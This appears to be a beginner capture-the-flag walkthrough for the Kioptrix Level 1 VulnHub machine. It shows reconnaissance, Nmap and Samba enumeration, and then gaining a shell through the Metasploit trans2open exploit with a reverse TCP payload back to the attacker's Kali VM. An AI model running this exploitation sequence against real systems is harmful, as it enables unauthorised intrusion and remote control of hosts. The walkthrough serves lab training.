# Kioptrix-boot2root
CyberLab-11


## #Overview  

This repository contains a walkthrough of the Kioptrix vulnerable machine from VulnHub.  
https://www.vulnhub.com/entry/kioptrix-level-1-1%2C22/

A beginner lab needs a clear finish line. **Kioptrix** gives you one: identify a route from initial discovery to root access inside the VM.     
Each step documents the **System Hacking** methodology, tools, commands, findings, and lessons learned throughout the attack.

---

## Enviroment

Before starting the attack, we need to prepare our lab environment and identify the target machine.  
- First, we will use a Kali Linux VM as our attacking machine.  
- Second, power on the installed Kioptrix (.ova) VM.  
- Both machines should be connected to the same virtual network (NAT is good) so that they can communicate with each other.

  
  ---

  ## 1-Reconnaissance

  - Check my Kali IP address (192.168.38.130). Both machines should be on the same network range.
 
    ```bash  
    ip a
    ```
    

    <img width="900" height="600" alt="image" src="https://github.com/user-attachments/assets/1253154a-a9c7-4c5e-a34c-434f113878dd" />

- We can now try Nmap but, I will go with netdiscover as both are on the same network.

  ```bash  
  sudo netdiscover -r 192.168.38.0/24
  ```


<img width="900" height="600" alt="image" src="https://github.com/user-attachments/assets/48bb0305-dd96-4b7a-86dd-61287653267f" />

Now that we have verified the network configuration, the vulnerable machine's IP address is (192.168.38.137).

---

## 2-Scanning & Enumeration  

- At this step, we will use the popular tool Nmap with the following options:

   ```bash  
   sudo nmap -sV -sS -sC -Pn -p- -T4 192.168.38.137
    ```

<img width="1008" height="770" alt="image" src="https://github.com/user-attachments/assets/003b9f37-7d28-4e52-8a1b-de0811663909" />  

- We identified the following open ports: **22, 80, 111, 139, and 443**. We can now begin our attack methodology by identifying the services and their versions and checking for any known exploit. Since **SMB (port 139)** and **HTTP/HTTPS (ports 80 and 443)** are common attack surfaces, we will focus our initial enumeration on these services.

- I will start with Samba enumeration, as Nmap did not display the Samba version. We will use the Metasploit Framework and its SMB scanner module to enumerate the service and hopefully identify its version.

  ```bash
  sudo msfconsole
  search smb_version
  use 0
  show options
  set rhosts 192.168.38.137
  run
  ```

  <img width="1143" height="797" alt="image" src="https://github.com/user-attachments/assets/9b4b3bd4-0926-4980-b467-9a08decb43fb" />

- We have now identified the Samba version running on the target machine (Samba 2.2.1a) and lets search if this version is vulnerable.

```bash
searchsploit samba 2.2.1a
```

<img width="1272" height="411" alt="image" src="https://github.com/user-attachments/assets/166e99bd-af92-4fb3-abd4-f59ae6afa684" />

---


## 3-Gaining Access

- After identifying a known **Trans2open** vulnerability affecting the Samba version, we can use the corresponding exploit module in the Metasploit Framework.

  ```bash
  sudo msfconsole
  use exploit/linux/samba/trans2open
  show options
  set payload generic/shell_reverse_tcp 
  set rhosts 192.168.38.137
  run
  ```

<img width="1006" height="707" alt="image" src="https://github.com/user-attachments/assets/ecc6db77-7f07-4857-9814-d0bb79f0dbde" />
<img width="911" height="307" alt="image" src="https://github.com/user-attachments/assets/38ddd048-d29f-4375-a263-3be5c624be94" />

**Note:** we used the (set payload generic/shell_reverse_tcp) payload because it allows the target machine to establish a reverse TCP connection back to our Kali.




  
